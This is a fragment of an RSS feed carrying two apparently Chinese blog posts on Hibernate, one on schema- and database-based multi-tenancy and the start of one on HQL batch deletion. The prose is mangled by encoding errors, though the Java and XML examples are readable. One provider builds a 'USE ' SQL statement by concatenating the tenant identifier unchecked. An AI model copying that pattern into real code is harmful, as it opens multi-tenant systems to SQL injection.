        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£</h4>
<p><code>MultiTenantConnectionProvider</code>æ¥å£ç”¨äºæä¾›åŸºäºç§Ÿæˆ·çš„è¿æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DataSource dataSource;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">(DataSource dataSource)</span> {
        <span class="hljs-built_in">this</span>.dataSource = dataSource;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSource.getConnection();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">final</span> <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> getAnyConnection();
        <span class="hljs-keyword">try</span> {
            connection.createStatement().execute(<span class="hljs-string">"USE "</span> + tenantIdentifier);
        } <span class="hljs-keyword">catch</span> (SQLException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not alter JDBC connection to specified schema ["</span> + tenantIdentifier + <span class="hljs-string">"]"</span>, e);
        }
        <span class="hljs-keyword">return</span> connection;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.createStatement().execute(<span class="hljs-string">"USE your_default_schema"</span>);
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-3">å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£</h4>
<p><code>CurrentTenantIdentifierResolver</code>æ¥å£ç”¨äºè§£æå½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">resolveCurrentTenantIdentifier</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä»ä¸Šä¸‹æ–‡æˆ–è€…è¯·æ±‚ä¸­è·å–å½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦</span>
        <span class="hljs-keyword">return</span> TenantContext.getCurrentTenant();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">validateExistingCurrentSessions</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h4 data-id="heading-4">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "price")</span>
    <span class="hljs-keyword">private</span> Double price;

    <span class="hljs-comment">// Getters and Setters</span>
}
</code></pre>
<h4 data-id="heading-5">ä½¿ç”¨å¤šç§Ÿæˆ·æ”¯æŒ</h4>
<p>åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨å¤šç§Ÿæˆ·æ”¯æŒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è®¾ç½®å½“å‰ç§Ÿæˆ·</span>
        TenantContext.setCurrentTenant(<span class="hljs-string">"tenant1"</span>);

        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product.setName(<span class="hljs-string">"Product A"</span>);
            product.setPrice(<span class="hljs-number">100.0</span>);
            session.save(product);
            transaction.commit();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-6">2. Database-based å¤šç§Ÿæˆ·</h3>
<p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œæ¯ä¸ªç§Ÿæˆ·æœ‰ç‹¬ç«‹çš„æ•°æ®åº“å®ä¾‹ã€‚</p>
<h4 data-id="heading-7">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_default_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- å¤šç§Ÿæˆ·é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multiTenancy"</span>&gt;</span>DATABASE<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.tenant_identifier_resolver"</span>&gt;</span>com.example.TenantIdentifierResolverImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.multi_tenant_connection_provider"</span>&gt;</span>com.example.MultiTenantConnectionProviderImpl<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-8">å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£</h4>
<p>å®ç°<code>MultiTenantConnectionProvider</code>æ¥å£ï¼Œç”¨äºæä¾›åŸºäºç§Ÿæˆ·çš„è¿æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.engine.jdbc.connections.spi.MultiTenantConnectionProvider;
<span class="hljs-keyword">import</span> org.hibernate.service.spi.Stoppable;

<span class="hljs-keyword">import</span> javax.sql.DataSource;
<span class="hljs-keyword">import</span> java.sql.Connection;
<span class="hljs-keyword">import</span> java.sql.SQLException;
<span class="hljs-keyword">import</span> java.util.HashMap;
<span class="hljs-keyword">import</span> java.util.Map;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiTenantConnectionProviderImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">MultiTenantConnectionProvider</span>, Stoppable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, DataSource&gt; dataSources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiTenantConnectionProviderImpl</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆå§‹åŒ–å„ä¸ªç§Ÿæˆ·çš„æ•°æ®æº</span>
        dataSources.put(<span class="hljs-string">"tenant1"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant1"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        dataSources.put(<span class="hljs-string">"tenant2"</span>, createDataSource(<span class="hljs-string">"jdbc:mysql://localhost:3306/tenant2"</span>, <span class="hljs-string">"username"</span>, <span class="hljs-string">"password"</span>));
        <span class="hljs-comment">// ... add other tenants</span>
    }

    <span class="hljs-keyword">private</span> DataSource <span class="hljs-title function_">createDataSource</span><span class="hljs-params">(String url, String username, String password)</span> {
        <span class="hljs-type">DataSourceBuilder</span> <span class="hljs-variable">dataSourceBuilder</span> <span class="hljs-operator">=</span> DataSourceBuilder.create();
        dataSourceBuilder.url(url);
        dataSourceBuilder.username(username);
        dataSourceBuilder.password(password);
        <span class="hljs-keyword">return</span> dataSourceBuilder.build();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getAnyConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> dataSources.get(<span class="hljs-string">"tenant1"</span>).getConnection(); <span class="hljs-comment">// é»˜è®¤ç§Ÿæˆ·è¿æ¥</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseAnyConnection</span><span class="hljs-params">(Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String tenantIdentifier)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> dataSources.get(tenantIdentifier);
        <span class="hljs-keyword">if</span> (dataSource != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> dataSource.getConnection();
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HibernateException</span>(<span class="hljs-string">"Could not find data source for tenant "</span> + tenantIdentifier);
        }
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseConnection</span><span class="hljs-params">(String tenantIdentifier, Connection connection)</span> <span class="hljs-keyword">throws</span> SQLException {
        connection.close();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsAggressiveRelease</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }

    <span class="hljs-comment">// Implement other required methods...</span>
}
</code></pre>
<h4 data-id="heading-9">å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£</h4>
<p>å®ç°<code>CurrentTenantIdentifierResolver</code>æ¥å£ï¼Œç”¨äºè§£æå½“å‰ç§Ÿæˆ·æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.context.spi.CurrentTenantIdentifierResolver;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TenantIdentifierResolverImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CurrentTenantIdentifierResolver</span> {

  
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ]]></title>    <link>https://juejin.cn/post/7597452210646810624</link>    <guid>https://juejin.cn/post/7597452210646810624</guid>    <pubDate>2026-01-21T11:55:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597452210646810624" data-draft-id="7597635202324824116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T11:55:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ56ï¼‰Hibernateçš„æ‰¹é‡åˆ é™¤ç­–ç•¥æ˜¯ä»€ä¹ˆï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:55:28.000Z" title="Wed Jan 21 2026 11:55:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Hibernateæä¾›äº†å‡ ç§æ–¹å¼æ¥å®ç°æ‰¹é‡åˆ é™¤æ“ä½œï¼Œä¸»è¦åŒ…æ‹¬ä½¿ç”¨HQLï¼ˆHibernate Query Languageï¼‰å’Œæ‰¹é‡æ“ä½œè®¾ç½®æ¥è¿›è¡Œä¼˜åŒ–ã€‚è¯¦ç»†è§£é‡Šå¦‚ä¸‹ï¼š</p>
<h3 data-id="heading-0">1. ä½¿ç”¨HQLè¿›è¡Œæ‰¹é‡åˆ é™¤</h3>
<p>é€šè¿‡HQLå¯ä»¥ç›´æ¥æ‰§è¡Œæ‰¹é‡åˆ é™¤æ“ä½œï¼Œé¿å…é€æ¡åˆ é™¤å®ä½“ã€‚ä»¥ä¸‹æ˜¯è¯¦ç»†å®ç°å’Œä»£ç ç¤ºä¾‹ï¼š</p>
<h4 data-id="heading-1">é…ç½®Hibernate</h4>
<p>åœ¨<code>hibernate.cfg.xml</code>ä¸­é…ç½®Hibernateï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Product"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h4 data-id="heading-2">å®ä½“ç±»å®šä¹‰</h4>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„å®ä½“ç±»<code>Product</code>çš„å®šä¹‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "product")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> {
    <span class="hljs-meta">@Id</span>
